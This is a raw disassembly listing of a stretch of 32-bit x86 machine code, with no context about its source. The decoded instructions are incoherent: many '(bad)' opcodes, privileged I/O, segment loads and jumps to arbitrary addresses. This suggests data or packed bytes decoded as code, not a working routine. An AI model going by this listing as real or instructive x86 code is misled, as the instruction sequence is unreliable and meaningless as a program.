  41cb3a:	mov    DWORD PTR [eax+0x6f],edx
  41cb3d:	or     al,0xf4
  41cb3f:	repnz (bad) 
  41cb41:	mov    bl,0x62
  41cb43:	mov    ebp,0x3fbcfe93
  41cb48:	jge    0x41cb6a
  41cb4a:	cmovnp esi,edx
  41cb4d:	out    dx,eax
  41cb4e:	xor    eax,0xe1c2848
  41cb53:	pusha  
  41cb54:	cmp    ecx,DWORD PTR [eax]
  41cb56:	ret    0xf7a5
  41cb59:	mov    dl,0x58
  41cb5b:	mov    bh,0x9e
  41cb5d:	scas   al,BYTE PTR es:[edi]
  41cb5e:	push   0x62ee9c40
  41cb63:	xchg   edx,eax
  41cb64:	pop    ecx
  41cb65:	sahf   
  41cb66:	inc    esp
  41cb67:	in     eax,0x89
  41cb69:	out    dx,al
  41cb6a:	mov    edx,ebp
  41cb6c:	mov    BYTE PTR [esi-0x7196fee2],dl
  41cb72:	xchg   DWORD PTR [ebp+eax*8+0x3fcba5eb],edi
  41cb79:	pop    eax
  41cb7a:	push   esp
  41cb7b:	mov    ebx,0x5568e549
  41cb80:	add    eax,0x84232627
  41cb85:	into   
  41cb86:	sub    al,ch
  41cb88:	inc    edi
  41cb89:	xor    edi,0xb654304a
  41cb8f:	outs   dx,BYTE PTR ds:[esi]
  41cb90:	pushf  
  41cb91:	mov    ch,0xa4
  41cb93:	sbb    dl,dh
  41cb95:	and    ebp,edx
  41cb97:	cmp    BYTE PTR [ecx-0x7fe0b541],ah
  41cb9d:	inc    edx
  41cb9e:	dec    edx
  41cb9f:	loop   0x41cbba
  41cba1:	sbb    DWORD PTR ds:0x39ec3f6c,0x43
  41cba8:	rcl    DWORD PTR [esi],0x34
  41cbab:	cmc    
  41cbac:	lods   eax,DWORD PTR ds:[esi]
  41cbad:	xor    bh,ah
  41cbaf:	sti    
  41cbb0:	inc    esp
  41cbb1:	jae    0x41cb80
  41cbb3:	aam    0x3d
  41cbb5:	xor    eax,0x21f3403e
  41cbba:	push   ecx
  41cbbb:	cmp    DWORD PTR [edx],0x3d
  41cbbe:	cmp    dl,BYTE PTR [edx]
  41cbc0:	aas    
  41cbc1:	(bad)  
  41cbc2:	ins    DWORD PTR es:[edi],dx
  41cbc3:	sub    al,0x83
  41cbc5:	jno    0x41cb4a
  41cbc7:	mov    WORD PTR [edx-0x8],gs
  41cbca:	adc    al,0x78
  41cbcc:	and    esp,DWORD PTR [ebp-0x7fb81063]
  41cbd2:	lods   eax,DWORD PTR ds:[esi]
  41cbd3:	(bad)  
  41cbd4:	pop    ds
  41cbd5:	out    dx,eax
  41cbd6:	xchg   DWORD PTR [ecx+0x3d5f3cf7],ecx
  41cbdc:	jno    0x41cbf8
  41cbde:	pop    ebp
  41cbdf:	push   edx
  41cbe0:	(bad)  
  41cbe2:	lds    esi,FWORD PTR [eax+0x2]
  41cbe5:	das    
  41cbe6:	lds    esi,FWORD PTR [eax]
  41cbe8:	xchg   ebx,eax
  41cbe9:	or     al,0x93
  41cbeb:	fldcw  WORD PTR [ebx+eax*4]
  41cbee:	add    BYTE PTR ds:0xe8101581,bh
  41cbf4:	adc    al,0x58
  41cbf6:	shl    BYTE PTR [eax+0x1c2655d9],0x6c
  41cbfd:	popa   
  41cbfe:	sar    ecx,cl
  41cc00:	cwde   
  41cc01:	loope  0x41cbca
  41cc03:	xchg   edi,eax
  41cc04:	lods   eax,DWORD PTR ds:[esi]
  41cc05:	xor    BYTE PTR [esp+ecx*2-0x5cf7e969],ah
  41cc0c:	xor    eax,0x2d0bcbe8
  41cc11:	or     al,0x94
  41cc13:	sub    al,0x26
  41cc15:	adc    al,0xe4
  41cc17:	cld    
  41cc18:	pop    ebp
  41cc19:	dec    edx
  41cc1a:	pop    ss
  41cc1b:	pop    esp
  41cc1c:	sar    BYTE PTR [edi],1
  41cc1e:	inc    ebx
  41cc1f:	mov    dl,0xb
  41cc21:	adc    esi,0xffffffed
  41cc24:	je     0x41cbd4
  41cc26:	push   es
  41cc27:	mov    es:0xb66ea0b5,al
  41cc2d:	add    al,0x65
  41cc2f:	not    eax
  41cc31:	ret    0xe9dc
  41cc34:	dec    esi
  41cc35:	and    BYTE PTR [ebp+0x6],bl
  41cc38:	lods   al,BYTE PTR ds:[esi]
  41cc39:	dec    eax
  41cc3a:	sti    
  41cc3b:	sbb    BYTE PTR cs:[ebx+0x70],al
  41cc3f:	xor    DWORD PTR ss:[esi+esi*2],eax
  41cc43:	mov    esi,0xc9222ae3
  41cc48:	std    
  41cc49:	(bad)  
  41cc4a:	leave  
  41cc4b:	mov    edi,0xd44cf6e4
  41cc50:	int3   
  41cc51:	das    
  41cc52:	inc    esi
  41cc53:	out    dx,al
  41cc54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc55:	(bad)  
  41cc56:	leave  
  41cc57:	pop    esp
  41cc58:	ja     0x41cbdc
  41cc5a:	mov    WORD PTR [edx+0x78],fs
  41cc5d:	fwait
  41cc5e:	ret    
  41cc5f:	jo     0x41cc14
  41cc61:	scas   eax,DWORD PTR es:[edi]
  41cc62:	aam    0x5c
  41cc64:	inc    ebp
  41cc65:	xchg   edi,eax
  41cc66:	sahf   
  41cc67:	push   edx
  41cc68:	push   eax
  41cc69:	and    eax,0x6cde03ce
  41cc6e:	les    esp,FWORD PTR [esi-0x55]
  41cc71:	mov    esp,0x8e3322b2
  41cc76:	call   DWORD PTR [ebp-0x30]
  41cc79:	or     BYTE PTR [edi],bl
  41cc7b:	mov    fs,WORD PTR [ecx+edi*4]
  41cc7e:	shr    DWORD PTR [ebx-0x7105ddd6],0xfc
  41cc85:	cmp    eax,0xa597975f
  41cc8a:	inc    ecx
  41cc8b:	and    al,0x3f
  41cc8d:	xor    BYTE PTR [ecx-0x1],bh
  41cc90:	pop    es
  41cc91:	ins    BYTE PTR es:[edi],dx
  41cc92:	nop
  41cc93:	dec    ebx
  41cc94:	cmp    eax,0x79975ac
  41cc99:	(bad)  
  41cc9a:	cli    
  41cc9b:	or     BYTE PTR ds:[esi],0xe0
  41cc9f:	inc    esi
  41cca0:	rcl    DWORD PTR [edi+0x77],1
  41cca3:	leave  
  41cca4:	push   ecx
  41cca5:	loop   0x41ccdb
  41cca7:	prefetchw BYTE PTR [ebx+eax*2-0x37]
  41ccac:	fwait
  41ccad:	cmp    edx,DWORD PTR [edi+edx*4-0x28abcdcf]
  41ccb4:	out    0x9e,eax
  41ccb6:	test   BYTE PTR [ebp-0x51e533d6],0xcf
  41ccbd:	out    0x39,eax
  41ccbf:	in     al,dx
  41ccc0:	inc    eax
  41ccc1:	aaa    
  41ccc2:	daa    
  41ccc3:	(bad)  
  41ccc4:	dec    eax
  41ccc5:	ret    0x7862
  41ccc8:	cs cli 
  41ccca:	scas   al,BYTE PTR es:[edi]
  41cccb:	mov    al,ds:0x8a9d13af
  41ccd0:	(bad)  
  41ccd1:	test   eax,0x17214aff
  41ccd6:	add    al,0x8a
  41ccd8:	out    dx,al
  41ccd9:	sub    cl,ch
  41ccdb:	aad    0x2b
  41ccdd:	jg     0x41ccb6
  41ccdf:	push   ebx
  41cce0:	and    al,0x8e
  41cce2:	sbb    ebx,ebx
  41cce4:	jbe    0x41ccea
  41cce6:	fwait
  41cce7:	mov    cl,0x13
  41cce9:	mov    al,ds:0xb1bc378f
  41ccee:	fimul  DWORD PTR [edi+edx*8+0x403c9d1a]
  41ccf5:	sub    eax,0xf566f095
  41ccfa:	mov    gs,ecx
  41ccfc:	retf   0x2460
  41ccff:	xchg   ebx,eax
  41cd00:	loop   0x41ccc2
  41cd02:	cdq    
  41cd03:	xor    dl,BYTE PTR [eax-0x50]
  41cd06:	rcr    dl,cl
  41cd08:	xchg   ebp,eax
  41cd09:	cmp    al,0xfd
  41cd0b:	cmc    
  41cd0c:	mov    cs,ebx
  41cd0e:	jmp    0x6a4018
  41cd13:	mov    ds:0x7fdbff4,eax
  41cd18:	inc    esi
  41cd19:	in     al,0x93
  41cd1b:	(bad)  
  41cd1c:	test   BYTE PTR [ecx],0xe
  41cd1f:	add    BYTE PTR [ebx+eax*1-0x694882a6],0x97
  41cd27:	push   0x3c1c9f1f
  41cd2c:	pop    ds
  41cd2d:	xchg   BYTE PTR [ebp+0x6d],al
  41cd30:	pop    ebp
  41cd31:	jl     0x41cd55
  41cd33:	jns    0x41cced
  41cd35:	loop   0x41cd06
  41cd37:	fsub   DWORD PTR [edi-0x2ee5d36f]
  41cd3d:	fbstp  TBYTE PTR [edi+0x7fe4c971]
  41cd43:	jb     0x41cd86
  41cd45:	imul   ecx,DWORD PTR [ebx+0x6d],0xf29cb562
  41cd4c:	retf   0xabbb
  41cd4f:	add    DWORD PTR [edi-0x53559a0],edx
  41cd55:	dec    eax
  41cd56:	push   edx
  41cd57:	sub    BYTE PTR [ecx-0x2a451c48],dh
  41cd5d:	jo     0x41cdac
  41cd5f:	inc    ebx
  41cd60:	lock adc edx,DWORD PTR [edi+0x51]
  41cd64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd66:	retf   
  41cd67:	sub    DWORD PTR [eax+0x39cacd4c],ebx
  41cd6d:	(bad)
  41cd70:	mov    edi,DWORD PTR [edi-0x229048a0]
  41cd76:	cmp    al,0x39
  41cd78:	retf   0xc984
  41cd7b:	mov    esi,0xf8a52fd3
  41cd80:	sbb    eax,0xb85de32b
  41cd85:	mov    ah,0x1c
  41cd87:	popa   
  41cd88:	call   0x1e59b99c
  41cd8d:	push   ss
  41cd8e:	nop
  41cd8f:	mov    WORD PTR [edx+0x24f58cd5],?
  41cd95:	iret   
  41cd96:	adc    DWORD PTR ds:0x2ef57382,ebp
  41cd9c:	mov    DWORD PTR [ebp-0x57],edx
  41cd9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cda0:	lahf   
  41cda1:	mov    al,ds:0x8c3bb7b8
  41cda6:	dec    eax
  41cda7:	ins    BYTE PTR es:[edi],dx
  41cda8:	ds xchg esp,eax
  41cdaa:	push   esp
  41cdab:	mov    edi,0xd9d86ea5
  41cdb0:	(bad)  
  41cdb1:	fsub   QWORD PTR [ecx]
  41cdb3:	aas    
  41cdb4:	push   edi
  41cdb5:	(bad)  
  41cdb6:	stc    
  41cdb7:	cmp    BYTE PTR [ecx-0x5cc228d7],bl
  41cdbd:	sbb    DWORD PTR [esi],ebx
  41cdbf:	mov    al,ss:0xe952f3c1
  41cdc5:	mov    esp,0x42ed9f14
  41cdca:	loop   0x41cdec
  41cdcc:	aas    
  41cdcd:	(bad)  
  41cdce:	jmp    0xca85:0x3d7b67e2
  41cdd5:	hlt    
  41cdd6:	mov    al,0xf6
  41cdd8:	jne    0x41cd63
  41cdda:	dec    esp
  41cddb:	push   cs
  41cddc:	mov    ebx,0x24a710f0
  41cde2:	mov    WORD PTR [ebx-0x1dea97cc],es
  41cde8:	dec    ebx
  41cde9:	fdivr  QWORD PTR [edi]
  41cdeb:	scas   eax,DWORD PTR es:[edi]
  41cdec:	repnz mov eax,ds:0x7ad1cbc5
  41cdf2:	mov    edx,0x2742e662
  41cdf7:	div    BYTE PTR [ebx]
  41cdf9:	jbe    0x41cdc7
  41cdfb:	mov    ds:0x9bdc7d1c,al
  41ce00:	in     al,dx
  41ce01:	enter  0xc265,0x72
  41ce05:	into   
  41ce06:	pop    edx
  41ce07:	int    0x67
  41ce09:	mov    cl,0x12
  41ce0b:	xchg   ecx,eax
  41ce0c:	jno    0x41cdcc
  41ce0e:	jmp    0x4983:0x6d71872
  41ce15:	mov    ds:0x6362c9ea,al
  41ce1a:	cmp    al,0x30
  41ce1c:	push   esp
  41ce1d:	jmp    0x72e63e0f
  41ce22:	push   ss
  41ce23:	(bad)
  41ce26:	outs   dx,BYTE PTR ds:[esi]
  41ce27:	inc    eax
  41ce28:	cmp    ebx,DWORD PTR [ebp-0x5a]
  41ce2b:	sti    
  41ce2c:	pop    ecx
  41ce2d:	jo     0x41ce9c
  41ce2f:	push   esp
  41ce30:	inc    esi
  41ce31:	pop    es
  41ce32:	add    eax,0x14739e7a
  41ce37:	jg     0x41cdc4
  41ce39:	adc    al,0xbb
  41ce3b:	fs mov al,0x9b
  41ce3e:	xor    DWORD PTR ds:0xf0fc5638,edi
  41ce44:	push   0xffffff9f
  41ce46:	dec    ecx
  41ce47:	push   esp
  41ce48:	leave  
  41ce49:	stos   DWORD PTR es:[edi],eax
  41ce4a:	(bad)  
  41ce4c:	stos   BYTE PTR es:[edi],al
  41ce4d:	repnz lods al,BYTE PTR ds:[esi]
  41ce4f:	add    edi,DWORD PTR [edi+0x2f2a231c]
  41ce55:	std    
  41ce56:	dec    ebx
  41ce57:	lock fsubr DWORD PTR [edi-0x45c4135e]
  41ce5e:	push   ebp
  41ce5f:	mov    ebx,0x8012f91
  41ce64:	js     0x41ce85
  41ce66:	in     al,0x7a
  41ce68:	in     eax,dx
  41ce69:	sub    ebp,DWORD PTR [ebx-0x2dc2d009]
  41ce6f:	or     BYTE PTR [edi+0x1ad70f2b],bl
  41ce75:	fadd   QWORD PTR [edx]
  41ce77:	pop    ebx
  41ce78:	loop   0x41ce1a
  41ce7a:	push   edx
  41ce7b:	add    al,0x4
  41ce7d:	sbb    al,0xa6
  41ce7f:	xchg   esi,eax
  41ce80:	push   ebx
  41ce81:	cmp    DWORD PTR [eax],0x9cea0850
  41ce87:	dec    esi
  41ce88:	not    BYTE PTR [esi-0x2a3aa8a8]
  41ce8e:	mov    eax,0xa10372f5
  41ce93:	cmc    
  41ce94:	test   al,0x1f
  41ce96:	retf   0x7815
  41ce99:	add    dh,bh
  41ce9b:	aad    0x69
  41ce9d:	mov    eax,ds:0xaa14ae3c
  41cea2:	push   esi
  41cea3:	outs   dx,DWORD PTR ds:[esi]
  41cea4:	pop    ebp
  41cea5:	jo     0x41ce39
  41cea7:	std    
  41cea8:	out    dx,eax
  41cea9:	xor    eax,0x5da9fd1a
  41ceae:	aaa    
  41ceaf:	fwait
  41ceb0:	test   al,0x4a
  41ceb2:	iret   
  41ceb3:	jmp    0x3472492b
  41ceb8:	pop    esp
  41ceb9:	mov    ah,0x96
  41cebb:	and    dh,bl
  41cebd:	and    BYTE PTR [esi+0x2c],bh
  41cec0:	(bad)  
  41cec2:	xor    eax,0x27f9c115
  41cec7:	cmp    BYTE PTR [ebx],bh
  41cec9:	fdivr  DWORD PTR [edi]
  41cecb:	push   ecx
  41cecc:	pop    ds
  41cecd:	fcmove st,st(0)
  41cecf:	and    eax,0x3c90e40c
  41ced4:	xchg   BYTE PTR [ebx],ah
  41ced6:	xchg   edi,eax
  41ced7:	dec    eax
  41ced8:	dec    edx
  41ced9:	aas    
  41ceda:	pop    es
  41cedb:	cmc    
  41cedc:	push   ebx
  41cedd:	jle    0x41cf14
  41cedf:	sub    eax,0x82e7782e
  41cee4:	mov    ds:0x88183f09,eax
  41cee9:	inc    eax
  41ceea:	pushf  
  41ceeb:	mov    eax,0xb2700d2a
  41cef0:	mov    dh,BYTE PTR [eax]
  41cef2:	push   ebp
  41cef3:	fxam   
  41cef5:	and    BYTE PTR [esi+0x3cc9e7ff],al
  41cefb:	outs   dx,DWORD PTR ds:[esi]
  41cefc:	sub    al,0xa3
  41cefe:	and    al,0x59
  41cf00:	jno    0x41cf3d
  41cf02:	daa    
  41cf03:	sar    DWORD PTR [esi+eiz*1-0x6],0x37
  41cf08:	(bad)  
  41cf09:	cmp    BYTE PTR [esi-0x15],al
  41cf0c:	push   ds
  41cf0d:	mov    ds:0x26caaa8,eax
  41cf12:	gs (bad) 
  41cf14:	outs   dx,BYTE PTR ds:[esi]
  41cf15:	test   al,0xbd
  41cf17:	jmp    0x41ceaf
  41cf19:	sbb    edx,DWORD PTR [edx]
  41cf1b:	in     al,0xbe
  41cf1d:	frstor [edi+ecx*4+0x62604ebc]
  41cf24:	or     DWORD PTR [eax+0x38],0x9f561807
  41cf2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf2c:	add    BYTE PTR [ebp+0x66293dbb],ah
  41cf32:	shr    dh,0x8
  41cf35:	inc    eax
  41cf36:	adc    eax,0x8bee6529
  41cf3b:	sub    al,0x40
  41cf3d:	sar    BYTE PTR [esi+ecx*2],cl
  41cf40:	test   edi,ebp
  41cf42:	add    al,0xcb
  41cf44:	xchg   dh,dl
  41cf46:	pop    ecx
  41cf47:	dec    eax
  41cf48:	leave  
  41cf49:	or     eax,0x3d5da009
  41cf4e:	mov    al,ds:0x3983b27b
  41cf53:	es jno 0x41cf4f
  41cf56:	mov    ecx,0x56bed7ae
  41cf5b:	mov    ch,0x8a
  41cf5d:	mov    cl,0x43
  41cf5f:	add    ah,ch
  41cf61:	stc    
  41cf62:	cld    
  41cf63:	pslld  mm0,QWORD PTR [edx+0x74]
  41cf67:	popf   
  41cf68:	imul   BYTE PTR [esi]
  41cf6a:	or     edi,DWORD PTR [ebx-0x7]
  41cf6d:	cmp    eax,0xa9e91daf
  41cf72:	or     BYTE PTR [edi+eiz*2-0x3e10e56a],ch
  41cf79:	repz scas al,BYTE PTR es:[edi]
  41cf7b:	sub    BYTE PTR ds:0x11ce90d4,bl
  41cf81:	jno    0x41cf76
  41cf83:	mov    BYTE PTR [edx+0x61],al
  41cf86:	xor    eax,0x511c5c0b
  41cf8b:	sub    ch,BYTE PTR [eax-0x4b]
  41cf8e:	sub    eax,0x5fe2767b
  41cf93:	add    al,0x51
  41cf95:	popf   
  41cf96:	imul   esp,DWORD PTR [ebx],0x18
  41cf99:	aaa    
  41cf9a:	jbe    0x41cfca
  41cf9c:	aas    
  41cf9d:	inc    esi
  41cf9e:	cmp    eax,ecx
  41cfa0:	inc    ebx
  41cfa1:	clc    
  41cfa2:	test   BYTE PTR [edi+0x21d5fad1],dh
  41cfa8:	fnstcw WORD PTR [ebx-0x13]
  41cfab:	or     ebx,DWORD PTR [ebx-0x38e4a0fd]
  41cfb1:	mov    cs,WORD PTR [edi]
  41cfb3:	pop    ebp
  41cfb4:	fwait
  41cfb5:	rcl    BYTE PTR [ebx+0x2d29043b],cl
  41cfbb:	and    ebp,edx
  41cfbd:	mov    BYTE PTR [ecx],ah
  41cfbf:	inc    ebx
  41cfc0:	dec    edi
  41cfc1:	arpl   bp,ax
  41cfc3:	sbb    eax,0x55a26197
  41cfc8:	pop    ds
  41cfc9:	pusha  
  41cfca:	mov    al,BYTE PTR [edx+0x6461b166]
  41cfd0:	pop    ds
  41cfd1:	int    0xdc
  41cfd3:	mov    eax,eax
  41cfd5:	sub    al,bl
  41cfd7:	(bad)  
  41cfd8:	ds int 0xa8
  41cfdb:	sub    dh,BYTE PTR [edi+0x68]
  41cfde:	inc    esi
  41cfdf:	shl    esi,1
  41cfe1:	add    eax,0xb4351ce7
  41cfe6:	and    DWORD PTR [esi+edx*4+0x4b],eax
  41cfea:	pushf  
  41cfeb:	repnz cwde 
  41cfed:	into   
  41cfee:	(bad)  
  41cfef:	std    
  41cff0:	cs mov esp,0x6b6890b4
  41cff6:	es ja  0x41cfa0
  41cff9:	in     eax,0x7f
  41cffb:	faddp  st(4),st
  41cffd:	and    eax,DWORD PTR [ebx+edx*8+0x12]
  41d001:	fisttp QWORD PTR [eax-0x5d]
  41d004:	jmp    FWORD PTR [edi-0x5]
  41d007:	xchg   edi,eax
  41d008:	cli    
  41d009:	mov    al,0x27
  41d00b:	mov    esp,esi
  41d00d:	pop    eax
  41d00e:	and    edx,esp
  41d010:	pop    ss
  41d011:	(bad)  
  41d012:	xor    edx,DWORD PTR ds:0xc2d1d0ac
  41d018:	jmp    FWORD PTR [ecx+0x40]
  41d01b:	jb     0x41d076
  41d01d:	xor    bl,bh
  41d01f:	loopne 0x41d08d
  41d021:	inc    esi
  41d022:	repz xchg edi,eax
  41d024:	add    ecx,ebp
  41d026:	std    
  41d027:	or     bl,al
  41d029:	clc    
  41d02a:	jb     0x41d005
  41d02c:	test   al,0xfd
  41d02e:	and    BYTE PTR [ecx],bl
  41d030:	cmp    al,0xe2
  41d032:	clc    
  41d033:	dec    edx
  41d034:	pop    ss
  41d035:	dec    esi
  41d036:	les    esp,FWORD PTR [eax]
  41d038:	daa    
  41d039:	mov    DWORD PTR [ebx+ebx*1-0xc],esp
  41d03d:	icebp  
  41d03e:	jno    0x41d02d
  41d040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d041:	mov    ah,0xf4
  41d043:	lods   al,BYTE PTR ds:[esi]
  41d044:	pop    ecx
  41d045:	int    0x40
  41d047:	cmp    ch,BYTE PTR [esi+ecx*2]
  41d04a:	xor    BYTE PTR [ebx+0x2e],cl
  41d04d:	icebp  
  41d04e:	jle    0x41cfd8
  41d050:	mov    cl,0x52
  41d052:	jb     0x41d09c
  41d054:	xchg   DWORD PTR [ebp+0x65c6aba7],esi
  41d05a:	scas   eax,DWORD PTR es:[edi]
  41d05b:	fldcw  WORD PTR [ecx]
  41d05d:	xchg   edx,eax
  41d05e:	add    eax,0xdcaf8103
  41d063:	mov    ds:0x48b608fd,al
  41d068:	mov    BYTE PTR [edx],al
  41d06a:	mov    ah,0x9
  41d06c:	jp     0x41d09b
  41d06e:	jne    0x41d0ac
  41d070:	hlt    
  41d071:	fdivr  QWORD PTR [ebx]
  41d073:	sbb    eax,ebp
  41d075:	(bad)  
  41d077:	or     dh,BYTE PTR [ecx+0xb]
  41d07a:	sbb    bh,0xac
  41d07d:	mov    ebp,0x66406168
  41d082:	repz mov eax,ds:0xf208588a
  41d088:	jecxz  0x41d0b2
  41d08a:	inc    eax
  41d08b:	clc    
  41d08c:	std    
  41d08d:	sub    eax,0xcda11aac
  41d092:	xor    esi,edi
  41d094:	push   ecx
  41d095:	mov    bl,0xbb
  41d097:	xor    BYTE PTR [edx-0x2ea9ca9],0x79
  41d09e:	adc    BYTE PTR [edi],bl
  41d0a0:	sbb    dh,BYTE PTR [esp+eiz*8]
  41d0a3:	sbb    BYTE PTR [ecx-0x17bc654b],bh
  41d0a9:	clc    
  41d0aa:	jmp    0x41d0de
  41d0ac:	sub    dl,BYTE PTR [edx+0x537f2672]
  41d0b2:	mov    dh,0x87
  41d0b4:	inc    ebx
  41d0b5:	in     al,dx
  41d0b6:	mov    eax,DWORD PTR [esi-0x1a427651]
  41d0bc:	loope  0x41d107
  41d0be:	hlt    
  41d0bf:	iret   
  41d0c0:	mov    ah,cl
  41d0c2:	add    ch,cl
  41d0c4:	inc    ebx
  41d0c5:	mov    ds:0x575891e9,eax
  41d0ca:	cs mov gs,edi
  41d0cd:	fld    QWORD PTR [ebp-0x80]
  41d0d0:	and    eax,0x191e138e
  41d0d5:	dec    eax
  41d0d6:	stos   DWORD PTR es:[edi],eax
  41d0d7:	gs stc 
  41d0d9:	(bad)  
  41d0da:	jecxz  0x41d0b5
  41d0dc:	cmc    
  41d0dd:	dec    edx
  41d0de:	arpl   WORD PTR [ebp-0x1ebc5281],bp
  41d0e4:	add    al,0xdb
  41d0e6:	and    DWORD PTR [eax-0x7d],0xc1e6ddf8
  41d0ed:	ret    
  41d0ee:	jl     0x41d0cf
  41d0f0:	mov    edx,0x28337a59
  41d0f5:	or     al,0xca
  41d0f7:	popf   
  41d0f8:	outs   dx,BYTE PTR ds:[esi]
  41d0f9:	push   edi
  41d0fa:	(bad)  
  41d0fb:	pushf  
  41d0fc:	fst    QWORD PTR [ecx-0x4bc41b48]
  41d102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d103:	mov    al,ds:0xe349bd48
  41d108:	xchg   DWORD PTR [edx+0x225a52c6],esi
  41d10e:	dec    ebp
  41d10f:	sub    al,0x1b
  41d111:	neg    BYTE PTR [esp+eax*4-0x74]
  41d115:	cs jne 0x41d102
  41d118:	popf   
  41d119:	iret   
  41d11a:	and    al,0x1b
  41d11c:	adc    esi,DWORD PTR [edi+0x33]
  41d11f:	into   
  41d120:	jmp    0x983f6523
  41d125:	jns    0x41d168
  41d127:	stos   DWORD PTR es:[edi],eax
  41d128:	adc    eax,0xb4252fb3
  41d12d:	or     BYTE PTR [ebp+0x4d6d49f2],ah
  41d133:	dec    edi
  41d134:	add    DWORD PTR [edi+0x2],ecx
  41d137:	shl    edx,1
  41d139:	jle    0x41d13a
  41d13b:	popf   
  41d13c:	inc    eax
  41d13d:	frstor [eax+esi*8-0x7a]
  41d141:	cmp    edi,ecx
  41d143:	cli    
  41d144:	sub    DWORD PTR [esi],0x77948472
  41d14a:	mov    dl,ch
  41d14c:	ror    DWORD PTR [esi+0x77],cl
  41d14f:	xor    ebx,DWORD PTR [ebx+0x78]
  41d152:	sub    DWORD PTR [edx],edi
  41d154:	xchg   esp,eax
  41d155:	rcr    edx,1
  41d157:	xchg   ebx,eax
  41d158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d159:	cmp    al,0x36
  41d15b:	or     ebp,ebx
  41d15d:	push   cs
  41d15e:	je     0x41d1d6
  41d160:	js     0x41d157
  41d162:	mov    edi,esp
  41d164:	les    ebx,FWORD PTR [esi-0x106f36dc]
  41d16a:	or     BYTE PTR [ecx+0xe94ab4],dh
  41d170:	cmp    esi,DWORD PTR [eax-0x5f]
  41d173:	mov    ecx,0x43ebf0d9
  41d178:	pop    esp
  41d179:	mov    bl,0x1b
  41d17b:	aad    0xc7
  41d17d:	nop
  41d17e:	dec    ebx
  41d17f:	dec    ebp
  41d180:	pop    ebp
  41d181:	stc    
  41d182:	clc    
  41d183:	xchg   DWORD PTR ds:0x4854892d,esp
  41d189:	sbb    DWORD PTR [ebp-0x26],esi
  41d18c:	sub    bl,BYTE PTR [ecx]
  41d18e:	addr16 mov edi,0x35154ef5
  41d194:	imul   ebp,DWORD PTR [edi+0x17fd662c],0xbf437cf5
  41d19e:	push   ebx
  41d19f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1a0:	pop    ss
  41d1a1:	sub    DWORD PTR [eax+ebx*8+0x74],0xfbe8360f
  41d1a9:	sub    eax,0xf2113622
  41d1ae:	and    al,0x3e
  41d1b0:	pop    esp
  41d1b1:	mov    ss,WORD PTR [edx]
  41d1b3:	xchg   ebx,eax
  41d1b4:	bound  ebx,QWORD PTR [edx-0x47]
  41d1b7:	xor    ebp,DWORD PTR [eax+0x4f32ba78]
  41d1bd:	mov    ebp,0xcf45b03
  41d1c2:	lahf   
  41d1c3:	shl    ah,cl
  41d1c5:	pop    esp
  41d1c6:	mov    al,ds:0xb174adbd
  41d1cb:	pop    ds
  41d1cc:	rcl    BYTE PTR [edi+0x7be78aa4],0x78
  41d1d3:	xchg   esp,eax
  41d1d4:	nop
  41d1d5:	or     dl,0x6
  41d1d8:	inc    edi
  41d1d9:	xor    BYTE PTR [edi-0x381c9354],dh
  41d1df:	add    eax,eax
  41d1e1:	les    ebx,FWORD PTR [edi+esi*1-0x7c]
  41d1e5:	pusha  
  41d1e6:	cwde   
  41d1e7:	mov    al,ds:0x6ab26ec4
  41d1ec:	pop    ecx
  41d1ed:	sub    DWORD PTR [edx+0x7c],eax
  41d1f0:	pop    edi
  41d1f1:	adc    BYTE PTR [ecx],dl
  41d1f3:	sbb    eax,0x48fe3a63
  41d1f8:	inc    esi
  41d1f9:	(bad)  
  41d1fb:	xlat   BYTE PTR ds:[ebx]
  41d1fc:	or     BYTE PTR [ebp+0x2b],cl
  41d1ff:	fyl2x  
  41d201:	inc    ebx
  41d202:	mov    ds:0x81653c6,al
  41d207:	(bad)  
  41d208:	dec    esp
  41d209:	sbb    al,0x84
  41d20b:	or     DWORD PTR [ecx-0x2bdba707],0xffffffb3
  41d212:	mov    al,ds:0x980ababb
  41d217:	push   esi
  41d218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d219:	xor    esp,edx
  41d21b:	mov    ch,0x83
  41d21d:	daa    
  41d21e:	add    DWORD PTR [ebp-0xd6d821f],0x7b
  41d225:	ret    
  41d226:	icebp  
  41d227:	shl    BYTE PTR [ebx+0x3df5d29],cl
  41d22d:	xor    DWORD PTR [ecx+0x6f829d88],0x359b22b1
  41d237:	shl    DWORD PTR [ecx],0xbb
  41d23a:	aaa    
  41d23b:	leave  
  41d23c:	jne    0x41d26d
  41d23e:	retf   0x6299
  41d241:	fistp  QWORD PTR [esp+edx*4]
  41d244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d245:	adc    al,0x7e
  41d247:	out    dx,al
  41d248:	sbb    al,0x1c
  41d24a:	ja     0x41d2c8
  41d24c:	test   al,0x81
  41d24e:	adc    BYTE PTR [esi+0xafb9a3e],ah
  41d254:	xor    DWORD PTR [esp+eax*1-0x87ba778],ebp
  41d25b:	int3   
  41d25c:	adc    eax,0x4d64097e
  41d261:	sub    al,0x1f
  41d263:	mov    ds:0xdb3978b0,al
  41d268:	(bad)  
  41d26a:	xor    ebx,0x55
  41d26d:	outs   dx,DWORD PTR ds:[esi]
  41d26e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d26f:	push   0x51c7f75b
  41d274:	leave  
  41d275:	sbb    ecx,DWORD PTR [eax+0xf]
  41d278:	sub    ah,BYTE PTR [edx]
  41d27a:	and    eax,0x625d1395
  41d27f:	cmp    eax,DWORD PTR [ecx]
  41d281:	xchg   ecx,eax
  41d282:	repnz mov ah,0x6b
  41d285:	cmp    BYTE PTR [esi-0x20],bh
  41d288:	mov    ebx,0xaa70eba
  41d28d:	fistp  WORD PTR [eax+0x43]
  41d290:	(bad)  
  41d291:	xor    BYTE PTR [esi+0x3cc664db],bh
  41d297:	or     eax,DWORD PTR [eax]
  41d299:	dec    eax
  41d29a:	inc    ebx
  41d29b:	sar    BYTE PTR [ebx+0x63],cl
  41d29e:	mov    eax,ds:0x2555686d
